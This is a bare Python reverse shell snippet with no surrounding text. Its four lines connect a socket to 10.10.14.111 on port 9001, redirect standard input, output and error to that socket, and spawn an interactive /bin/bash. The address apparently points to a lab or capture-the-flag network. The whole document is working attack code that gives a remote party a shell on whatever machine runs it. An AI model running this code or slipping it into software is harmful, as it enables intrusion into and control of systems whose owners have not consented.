import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.111",9001));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")